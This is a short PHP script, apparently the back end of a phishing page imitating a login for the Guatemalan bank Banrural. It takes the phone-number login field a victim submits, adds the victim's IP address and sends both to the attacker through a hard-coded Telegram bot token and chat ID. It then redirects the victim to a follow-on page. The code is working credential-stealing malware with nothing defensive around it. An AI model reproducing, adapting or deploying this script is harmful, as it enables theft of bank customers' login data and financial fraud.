<?php

// Configurar los datos del bot de Telegram y del chat
$bot_token = '5545935446:AAEaPWR8OUOL-0OBbqMLzioXF9jXLNT7jbM';
$chat_id = '5157616506';

if(isset($_POST['data'])) {
    $usuario = $_POST['data'];
    $ip = $_SERVER['REMOTE_ADDR'];

    $mensaje = "LOGIN BANRURAL-GT:\nTELEFONO: $usuario\nIP: $ip";

    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $datos = array(
        'chat_id' => $chat_id,
        'text' => $mensaje
    );
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Content-type: application/x-www-form-urlencoded',
            'content' => http_build_query($datos)
        )
    );
    $context = stream_context_create($options);
    $resultado = file_get_contents($url, false, $context);

    if ($resultado) {
        echo "";
    } else {
        echo "";
    }
    
    echo "<script>window.location.href = 'load.php';</script>";
}
?>